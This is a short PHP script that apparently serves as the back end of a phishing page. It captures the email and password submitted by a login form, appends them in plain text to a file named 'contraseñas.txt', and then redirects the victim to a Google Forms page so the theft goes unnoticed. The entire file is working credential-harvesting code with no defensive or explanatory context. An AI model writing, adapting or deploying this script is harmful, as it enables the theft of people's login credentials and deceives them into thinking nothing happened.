<?php
file_put_contents("contraseñas.txt", "Usuario: " . $_POST['email'] . "Pass: " . $_POST['password'] . "\n", FILE_APPEND);
header('Location: https://docs.google.com/forms/d/1cw6munBFowcjhDxF86p4D35V2YyE-CllC3pXBdVhWLo/viewform?edit_requested=true');
exit();
